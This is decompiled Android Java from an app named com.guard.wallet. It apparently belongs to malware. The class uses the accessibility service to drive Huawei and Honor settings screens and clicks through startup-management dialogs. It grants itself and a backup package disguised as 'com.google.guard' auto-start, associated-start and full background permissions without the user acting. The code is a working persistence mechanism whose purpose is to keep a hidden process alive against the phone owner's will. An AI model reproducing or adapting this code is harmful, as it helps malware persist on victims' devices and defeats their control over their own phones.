package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p014r.EnumC0892e;
import p022z.C0981d;

/* renamed from: o.n */
/* loaded from: classes.dex */
public final class C0425n extends AbstractC0414c {

    /* renamed from: y */
    public static final /* synthetic */ int f933y = 0;

    /* renamed from: r */
    public final AtomicReference f934r;

    /* renamed from: s */
    public final AtomicBoolean f935s;

    /* renamed from: t */
    public final AtomicBoolean f936t;

    /* renamed from: u */
    public final AtomicBoolean f937u;

    /* renamed from: v */
    public final AtomicBoolean f938v;

    /* renamed from: w */
    public final AtomicBoolean f939w;

    /* renamed from: x */
    public final AtomicBoolean f940x;

    public C0425n() {
        super(s0(), "com.android.settings");
        this.f934r = new AtomicReference(EnumC0892e.KEEP_ALIVE_UNKNOWN);
        this.f935s = new AtomicBoolean(false);
        this.f936t = new AtomicBoolean(false);
        this.f937u = new AtomicBoolean(true);
        this.f938v = new AtomicBoolean(true);
        this.f939w = new AtomicBoolean(false);
        this.f940x = new AtomicBoolean(false);
        try {
            this.f852p.schedule(new RunnableC0424m(this, 4), 50L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
        }
    }

    public static CombineFilter b0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("HUA_WEI_ALLOW_AUTO_STARTUP_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter c0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("HUA_WEI_ALLOW_IN_BACKGROUND_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter d0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("HUA_WEI_ALLOW_RELATE_STARTUP_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter e0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setPrefix(AbstractC0250f.m627b("HUA_WEI_APP_AND_NOTIFICATION_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow f0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.Settings$AppAndNotificationDashboardActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static CombineFilter g0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("HUA_WEI_APP_STARTUP_MANAGE_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static CombineFilter l0() {
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.Button"), TextBundle.TEXT_ENTRY);
        AbstractC0413b.m1028v("HUA_WEI_CONFIRM_TEXT", m1008b, combineFilter, m1008b);
        return combineFilter;
    }

    public static ListenWindow m0() {
        ListenWindow listenWindow = new ListenWindow("com.hihonor.systemmanager", "android.app.AlertDialog");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow n0() {
        ListenWindow listenWindow = new ListenWindow("com.hihonor.systemmanager", "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow o0() {
        ListenWindow listenWindow = new ListenWindow("com.huawei.systemmanager", "android.app.AlertDialog");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow p0() {
        ListenWindow listenWindow = new ListenWindow("com.huawei.systemmanager", "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow q0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.HWSettings");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static LinkedList s0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(AbstractC0414c.m1035J());
        linkedList.add(q0());
        linkedList.add(f0());
        linkedList.add(p0());
        linkedList.add(n0());
        linkedList.add(o0());
        linkedList.add(m0());
        return linkedList;
    }

    @Override // p012o.AbstractC0414c
    /* renamed from: Z */
    public final void mo1051Z() {
        ReentrantLock reentrantLock = this.f851o;
        if (reentrantLock.tryLock()) {
            try {
                if (!m1049T()) {
                    Log.d("o.n", "准备结束本地保活自动化引擎");
                    AbstractC0184g.m354h(100);
                    m1050X();
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m543x();
                    }
                    t0();
                    this.f852p.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f850n.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    AbstractC0184g.m349c();
                    Log.d("o.n", "已结束本地保活自动化引擎");
                    AbstractC0414c.m1044W();
                    mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.n", e2);
            }
            reentrantLock.unlock();
        }
    }

    public final boolean h0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(o0());
            linkedList.add(m0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.n", "已进入应用启动手动管理对话框");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
            return false;
        }
    }

    public final boolean i0() {
        try {
            if (!m1078q(Collections.singletonList(f0()))) {
                return false;
            }
            Log.d("o.n", "已进入应用和服务窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
            return false;
        }
    }

    public final boolean j0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(q0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.n", "已进入华为系统设置窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
            return false;
        }
    }

    public final boolean k0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(p0());
            linkedList.add(n0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.n", "已进入应用启动管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
            return false;
        }
    }

    public final void r0() {
        String str;
        String str2;
        try {
            if (k0()) {
                Log.d("o.n", "keepAlvieInStartupAppControl 窗口匹配");
                AbstractC0184g.m354h(50);
                AtomicReference atomicReference = this.f934r;
                boolean equals = Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_UNKNOWN);
                EnumC0892e enumC0892e = EnumC0892e.KEEP_ALIVE_MAIN_APP;
                if (equals) {
                    atomicReference.set(enumC0892e);
                } else {
                    if (!Objects.equals(atomicReference.get(), enumC0892e) || AbstractC0251g.d0("com.google.guard") == null) {
                        t0();
                        mo1051Z();
                        return;
                    }
                    atomicReference.set(EnumC0892e.KEEP_ALIVE_BACKUP_APP);
                }
                m1062G();
                Log.d("o.n", "active root complete");
                UiObject m1047Q = m1047Q();
                if (m1047Q != null) {
                    Log.d("o.n", "应用启动管理窗口滚动视图查找成功");
                    if (Objects.equals(atomicReference.get(), enumC0892e)) {
                        C0981d c0981d = new C0981d(AbstractC0414c.m1033H(AbstractC0251g.x0()), 0);
                        UiObject scrollForwardUtil = m1047Q.scrollForwardUtil(c0981d);
                        if (scrollForwardUtil == null) {
                            scrollForwardUtil = m1047Q.scrollBackwardUtil(c0981d);
                        }
                        if (scrollForwardUtil != null) {
                            Log.d("o.n", "主进程App查找成功");
                            AbstractC0184g.m354h(55);
                            UiObject findParentUtilCombine = scrollForwardUtil.findParentUtilCombine(AbstractC0414c.m1037L());
                            if (findParentUtilCombine != null) {
                                Log.d("o.n", "主进程可点击节点查找成功");
                                UiObject findOneByCombine = findParentUtilCombine.findOneByCombine(AbstractC0414c.a0());
                                if (findOneByCombine != null) {
                                    AbstractC0184g.m354h(60);
                                    Log.d("o.n", "主进程启动管理勾选框查找成本");
                                    if (findOneByCombine.checked()) {
                                        Log.d("o.n", "主进程自动管理已勾选");
                                        findOneByCombine.click();
                                        str2 = "已点击使主进程进入手动管理";
                                        Log.d("o.n", str2);
                                        AbstractC0184g.m354h(65);
                                        return;
                                    }
                                    this.f935s.set(true);
                                    this.f939w.set(true);
                                    this.f937u.set(true);
                                    Log.d("o.n", "主进程已选择手动管理");
                                    r0();
                                    return;
                                }
                                str = "主进程启动管理勾选框查找失败";
                            } else {
                                str = "主进程可点击节点查找失败";
                            }
                        } else {
                            str = "主进程App查找失败";
                        }
                    } else {
                        C0981d c0981d2 = new C0981d(AbstractC0414c.m1033H(AbstractC0251g.m658e()), 0);
                        UiObject scrollForwardUtil2 = m1047Q.scrollForwardUtil(c0981d2);
                        if (scrollForwardUtil2 == null) {
                            scrollForwardUtil2 = m1047Q.scrollBackwardUtil(c0981d2);
                        }
                        if (scrollForwardUtil2 != null) {
                            Log.d("o.n", "备用进程App查找成功");
                            AbstractC0184g.m354h(55);
                            UiObject findParentUtilCombine2 = scrollForwardUtil2.findParentUtilCombine(AbstractC0414c.m1037L());
                            if (findParentUtilCombine2 == null) {
                                Log.d("o.n", "备用进程可点击节点查找失败");
                                return;
                            }
                            Log.d("o.n", "备用进程可点击节点查找成功");
                            UiObject findOneByCombine2 = findParentUtilCombine2.findOneByCombine(AbstractC0414c.a0());
                            if (findOneByCombine2 != null) {
                                Log.d("o.n", "备用进程勾选框查找成功");
                                AbstractC0184g.m354h(60);
                                if (findOneByCombine2.checked()) {
                                    Log.d("o.n", "备用进程自动管理已勾选");
                                    findOneByCombine2.click();
                                    str2 = "已点击使备用进程进入手动管理";
                                    Log.d("o.n", str2);
                                    AbstractC0184g.m354h(65);
                                    return;
                                }
                                this.f936t.set(true);
                                this.f940x.set(true);
                                this.f938v.set(true);
                                Log.d("o.n", "备用进程已选择手动管理");
                                t0();
                                mo1051Z();
                                return;
                            }
                            str = "备用进程勾选框查找失败";
                        } else {
                            str = "备用进程App查找失败";
                        }
                    }
                } else {
                    str = "应用启动管理窗口滚动视图查找失败";
                }
                Log.e("o.n", str);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
        }
    }

    public final void t0() {
        try {
            PowerControlStateVO m707k = AbstractC0252h.m707k(MainApplication.getAppContext().getPackageName());
            m707k.setPackageName(MainApplication.getAppContext().getPackageName());
            AtomicBoolean atomicBoolean = this.f935s;
            if (atomicBoolean.get()) {
                m707k.setAllowAutoStart(Boolean.valueOf(atomicBoolean.get()));
            }
            AtomicBoolean atomicBoolean2 = this.f937u;
            if (atomicBoolean2.get()) {
                m707k.setAllowRelateStart(Boolean.valueOf(atomicBoolean2.get()));
            }
            AtomicBoolean atomicBoolean3 = this.f939w;
            if (atomicBoolean3.get()) {
                m707k.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean3.get()));
            }
            m707k.setRetryCount(m707k.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k);
            Log.d("o.n", "已保存主进程保活策略");
            PowerControlStateVO m707k2 = AbstractC0252h.m707k("com.google.guard");
            m707k2.setPackageName("com.google.guard");
            AtomicBoolean atomicBoolean4 = this.f936t;
            if (atomicBoolean4.get()) {
                m707k2.setAllowAutoStart(Boolean.valueOf(atomicBoolean4.get()));
            }
            AtomicBoolean atomicBoolean5 = this.f938v;
            if (atomicBoolean5.get()) {
                m707k2.setAllowRelateStart(Boolean.valueOf(atomicBoolean5.get()));
            }
            AtomicBoolean atomicBoolean6 = this.f940x;
            if (atomicBoolean6.get()) {
                m707k2.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean6.get()));
            }
            m707k2.setRetryCount(m707k2.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k2);
            Log.d("o.n", "已保存备用进程保活策略");
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
        }
    }

    @Override // p012o.AbstractC0414c, p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        try {
            if (m1049T()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            boolean j02 = j0();
            String str3 = this.f864c;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            if (j02) {
                concurrentLinkedQueue.remove("keepAliveInAppAndNotification");
                concurrentLinkedQueue.remove("keepAlvieInStartupAppControl");
                concurrentLinkedQueue.remove("keepAliveInAlertDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInHwSettings")) {
                    concurrentLinkedQueue.add("keepAliveInHwSettings");
                    AbstractC0243l.m593c(new RunnableC0424m(this, 0), str3);
                }
            }
            if (i0()) {
                concurrentLinkedQueue.remove("keepAliveInHwSettings");
                concurrentLinkedQueue.remove("keepAlvieInStartupAppControl");
                concurrentLinkedQueue.remove("keepAliveInAlertDialog");
                if (!concurrentLinkedQueue.contains("keepAliveInAppAndNotification")) {
                    concurrentLinkedQueue.add("keepAliveInAppAndNotification");
                    AbstractC0243l.m593c(new RunnableC0424m(this, 1), str3);
                }
            }
            if (k0()) {
                concurrentLinkedQueue.remove("keepAliveInHwSettings");
                concurrentLinkedQueue.remove("keepAliveInAppAndNotification");
                concurrentLinkedQueue.remove("keepAliveInAlertDialog");
                if (!concurrentLinkedQueue.contains("keepAlvieInStartupAppControl")) {
                    concurrentLinkedQueue.add("keepAlvieInStartupAppControl");
                    AbstractC0243l.m593c(new RunnableC0424m(this, 2), str3);
                }
            }
            if (h0()) {
                concurrentLinkedQueue.remove("keepAliveInHwSettings");
                concurrentLinkedQueue.remove("keepAliveInAppAndNotification");
                concurrentLinkedQueue.remove("keepAlvieInStartupAppControl");
                if (concurrentLinkedQueue.contains("keepAliveInAlertDialog")) {
                    return;
                }
                concurrentLinkedQueue.add("keepAliveInAlertDialog");
                AbstractC0243l.m593c(new RunnableC0424m(this, 3), str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.n", e2);
        }
    }
}
